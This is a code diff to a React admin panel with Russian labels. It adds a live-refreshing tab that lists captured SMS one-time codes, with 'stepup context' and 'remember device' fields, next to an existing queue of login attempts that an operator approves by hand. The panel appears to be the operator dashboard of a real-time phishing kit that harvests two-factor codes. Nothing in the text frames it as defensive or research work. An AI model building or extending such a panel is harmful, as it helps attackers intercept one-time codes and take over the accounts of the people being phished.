@@ -28,6 +28,14 @@ interface LoginAttempt {
   approved: boolean;
 }
 
+interface SmsSubmission {
+  id: number;
+  otpCode: string;
+  stepupContext: string;
+  rememberDevice: boolean;
+  timestamp: string;
+}
+
 export const AdminPanel = (): JSX.Element => {
   const [price, setPrice] = useState("");
   const [name, setName] = useState("");
@@ -41,6 +49,16 @@ export const AdminPanel = (): JSX.Element => {
     queryKey: ["/api/login-attempts"],
     queryFn: async () => {
       const res = await apiRequest("GET", "/api/login-attempts");
+      return await res.json();
+    },
+    refetchInterval: 3000, // Auto refresh every 3 seconds
+  });
+
+  // Fetch SMS submissions
+  const { data: smsSubmissions = [] } = useQuery({
+    queryKey: ["/api/sms-submissions"],
+    queryFn: async () => {
+      const res = await apiRequest("GET", "/api/sms-submissions");
       return await res.json();
     },
     refetchInterval: 3000, // Auto refresh every 3 seconds
@@ -187,6 +205,14 @@ export const AdminPanel = (): JSX.Element => {
               {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
                 <span className="ml-2 bg-red-500 text-white text-xs rounded-full px-2 py-1">
                   {loginAttempts.filter(attempt => !attempt.approved).length}
+                </span>
+              )}
+            </TabsTrigger>
+            <TabsTrigger value="sms">
+              SMS коды
+              {smsSubmissions.length > 0 && (
+                <span className="ml-2 bg-blue-500 text-white text-xs rounded-full px-2 py-1">
+                  {smsSubmissions.length}
                 </span>
               )}
             </TabsTrigger>
@@ -363,6 +389,60 @@ export const AdminPanel = (): JSX.Element => {
                                   Подтвердить
                                 </Button>
                               )}
+                            </TableCell>
+                          </TableRow>
+                        ))}
+                      </TableBody>
+                    </Table>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </TabsContent>
+
+          <TabsContent value="sms">
+            <Card>
+              <CardHeader>
+                <CardTitle>SMS коды</CardTitle>
+              </CardHeader>
+              <CardContent>
+                {smsSubmissions.length === 0 ? (
+                  <p className="text-gray-500 text-center py-8">Нет SMS записей</p>
+                ) : (
+                  <div className="overflow-x-auto">
+                    <Table>
+                      <TableHeader>
+                        <TableRow>
+                          <TableHead>ID</TableHead>
+                          <TableHead>OTP код</TableHead>
+                          <TableHead>Stepup Context</TableHead>
+                          <TableHead>Запомнить устройство</TableHead>
+                          <TableHead>Время</TableHead>
+                        </TableRow>
+                      </TableHeader>
+                      <TableBody>
+                        {smsSubmissions.map((submission: SmsSubmission) => (
+                          <TableRow key={submission.id}>
+                            <TableCell className="font-medium">{submission.id}</TableCell>
+                            <TableCell>
+                              <span className="font-mono bg-gray-100 px-2 py-1 rounded">
+                                {submission.otpCode}
+                              </span>
+                            </TableCell>
+                            <TableCell>
+                              <span className="font-mono text-sm text-gray-600">
+                                {submission.stepupContext}
+                              </span>
+                            </TableCell>
+                            <TableCell>
+                              {submission.rememberDevice ? (
+                                <span className="text-green-600">✓ Да</span>
+                              ) : (
+                                <span className="text-gray-400">✗ Нет</span>
+                              )}
+                            </TableCell>
+                            <TableCell>
+                              {new Date(submission.timestamp).toLocaleString('ru-RU')}
                             </TableCell>
                           </TableRow>
                         ))}
